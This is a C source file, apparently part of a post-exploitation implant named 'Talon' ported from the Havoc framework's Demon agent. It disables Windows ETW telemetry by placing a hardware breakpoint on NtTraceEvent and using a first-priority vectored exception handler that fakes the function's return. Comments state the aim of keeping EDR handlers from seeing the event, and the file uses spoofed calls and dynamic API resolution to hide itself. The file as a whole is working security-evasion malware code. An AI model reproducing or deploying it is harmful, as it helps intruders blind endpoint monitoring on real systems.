#include <Talon.h>

#include <Core.h>
#include <Etw.h>
#include <Spoof.h>

/* ETW interception via hardware breakpoint — ported from Demon (Havoc)
 * HwBpEngine, simplified for Talon's single-threaded design. See Etw.h for
 * the mechanism summary. */

static PVOID  g_NtTraceEvent = NULL;
static HANDLE g_Veh          = NULL;

/* First-in-line VEH: consumes the single-step exception raised when the Dr0
 * breakpoint on NtTraceEvent hits, and emulates the function returning
 * immediately (RIP -> caller's return address, Rsp adjusted as a ret would).
 * Returning CONTINUE_EXECUTION means no other VEH — including EDR ones — ever
 * sees the exception. */
LONG WINAPI EtwVehHandler( PEXCEPTION_POINTERS Exception )
{
    if ( Exception->ExceptionRecord->ExceptionCode != STATUS_SINGLE_STEP )
        return EXCEPTION_CONTINUE_SEARCH;

    if ( ! g_NtTraceEvent ||
         Exception->ExceptionRecord->ExceptionAddress != g_NtTraceEvent )
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT Ctx = Exception->ContextRecord;

    ULONG_PTR Return = ( ULONG_PTR ) * ( ( PVOID * ) Ctx->Rsp ); /* ret addr pushed by call NtTraceEvent */
    Ctx->Rsp += sizeof( PVOID );                                 /* same pop a ret performs */
    Ctx->Rip = Return;

    return EXCEPTION_CONTINUE_EXECUTION;
}

BOOL EtwBpArm( VOID )
{
    CONTEXT Ctx = { 0 };

    if ( ! g_NtTraceEvent )
        return FALSE;

    Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( ! SPOOF_CALL( GetThreadContext, GetCurrentThread(), &Ctx ) )
        return FALSE;

    /* local execution breakpoint on DR0 (length/type bits left at default) */
    Ctx.Dr0 = ( ULONG_PTR ) g_NtTraceEvent;
    Ctx.Dr7 &= ~( 1ull << 0 );  /* clear L0   */
    Ctx.Dr7 &= ~( 3ull << 16 ); /* clear LEN0 */
    Ctx.Dr7 |=   ( 1ull << 0 );

    return SPOOF_CALL( SetThreadContext, GetCurrentThread(), &Ctx ) != 0;
}

VOID EtwBpDisarm( VOID )
{
    CONTEXT Ctx = { 0 };

    if ( ! g_NtTraceEvent )
        return;

    Ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if ( ! SPOOF_CALL( GetThreadContext, GetCurrentThread(), &Ctx ) )
        return;

    Ctx.Dr0 = 0;
    Ctx.Dr7 &= ~( 1ull << 0 );

    SPOOF_CALL( SetThreadContext, GetCurrentThread(), &Ctx );
}

VOID EtwInit( VOID )
{
    HMODULE hNtdll = GetModuleHandleA( "ntdll" );
    if ( ! hNtdll )
        return;

    g_NtTraceEvent = ( PVOID ) GetProcAddress( hNtdll, "NtTraceEvent" );
    if ( ! g_NtTraceEvent )
        return;

    /* resolved dynamically — no ntdll import in the table */
    typedef HANDLE ( WINAPI * RtlAddVehFn )( ULONG, PVECTORED_EXCEPTION_HANDLER );
    RtlAddVehFn Add = ( RtlAddVehFn ) GetProcAddress( hNtdll, "RtlAddVectoredExceptionHandler" );
    if ( ! Add )
        return;

    g_Veh = Add( 1, EtwVehHandler ); /* First=1: runs before any EDR VEH */

    Dbg( "EtwInit: NtTraceEvent=%p veh=%p\n", g_NtTraceEvent, g_Veh );
}
